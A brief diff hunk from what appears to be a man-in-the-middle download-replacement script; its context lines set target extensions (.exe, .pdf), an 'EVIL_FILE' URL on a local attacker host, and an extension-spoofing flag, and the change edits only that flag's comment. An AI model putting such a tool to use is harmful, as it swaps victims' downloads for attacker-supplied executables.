@@ -26,7 +26,7 @@ IP = ("192.168.61.11")
 TARGET_TEXTENSIONS = [".exe", ".pdf"]
 EVIL_FILE = "http://192.168.61.11/run.exe"
 WEB_ROOT = "/var/www/html/"
-SPOOF_EXTENSION = False # JUST set it to force if u want programm to stop spoofing files extensions
+SPOOF_EXTENSION = False # JUST set it to True  if u want programm to spoof files extensions
 
 def request(flow):
 	
